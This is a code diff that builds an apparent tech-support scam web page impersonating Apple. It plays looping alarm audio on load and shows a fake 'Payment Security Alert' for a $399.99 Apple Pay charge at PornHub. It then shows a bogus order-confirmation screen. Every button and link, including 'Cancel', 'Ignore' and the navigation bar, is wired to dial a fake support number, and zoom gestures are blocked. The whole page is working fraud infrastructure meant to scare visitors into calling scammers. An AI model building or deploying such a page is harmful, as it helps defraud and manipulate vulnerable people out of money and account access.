+// Gap between each due83.wav play (milliseconds)
+const DUE_TO_DUE_GAP = 17000;   // 17s
+
+let dueLoopRunning = false;
+
+// Play main looping audio + start due loop on load
+window.addEventListener("load", () => {
+    audio.play().catch(() => {
+        console.log("Autoplay blocked until user interaction");
+    });
+    startDueLoop();
+});
+
+// Simple, restartable loop using setTimeout
+function startDueLoop() {
+    if (dueLoopRunning) return;
+    dueLoopRunning = true;
+    playDue();
+}
+
+function playDue() {
+    try { due.currentTime = 0; } catch (e) {}
+    due.play().catch(() => {});
+
+    due.onended = () => {
+        setTimeout(playDue, DUE_TO_DUE_GAP);
+    };
+}
+
+// Fallback: if autoplay was blocked, kick off on first user click
+document.addEventListener("click", () => {
+    audio.play().catch(() => {});
+    startDueLoop();
+}, { once: true });
+</script>
+
+<!-- ============ NEW POPUP ============ -->
+<div class="popup-overlay" id="paymentPopup">
+
+    <div class="ps-popup" role="dialog" aria-modal="true">
+
+      <div class="popup-header">
+        <div class="brand-icon">
+          <img src="3553gg3h.png" alt="Apple Pay">
+        </div>
+
+        <h2>Payment Security Alert</h2>
+        <p>Unusual transaction detected</p>
+      </div>
+
+      <div class="popup-body">
+
+        <p>
+          A potentially unauthorized payment was reported
+          in connection with this payment account.
+        </p>
+
+        <div class="transaction-box">
+
+          <div class="transaction-row">
+            <span>Merchant</span>
+            <span>PornHub</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Payment Method</span>
+            <span>Apple Pay</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Amount</span>
+            <span class="amount">$399.99</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Transaction ID</span>
+            <span>APX-728491</span>
+          </div>
+
+          <div class="transaction-row">
+            <span>Status</span>
+            <span class="status">Completed</span>
+          </div>
+
+        </div>
+
+        <div class="notice">
+          <strong>Important:</strong>
+          <span>If You believe this transaction is unauthorized,</span>
+          <span>Please contact Apple Support at <strong data-phone-display>+1(855) 397-2122</strong></span>
+        </div>
+
+        <div class="buttons">
+          <button class="primary-btn" data-phone-tel>
+            Call Now
+          </button>
+
+          <button class="secondary-btn" data-phone-tel>
+            Cancel
+          </button>
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+<!-- ============ END NEW POPUP ============ -->
+
+<nav class="apple-nav" data-phone-tel style="cursor:pointer;">
+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
+  
+  <div class="spinner"></div>
+</div>
+
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
 })();
 </script>
-<!--End of Tawk.to Script-->
 </body>
+
 </html>
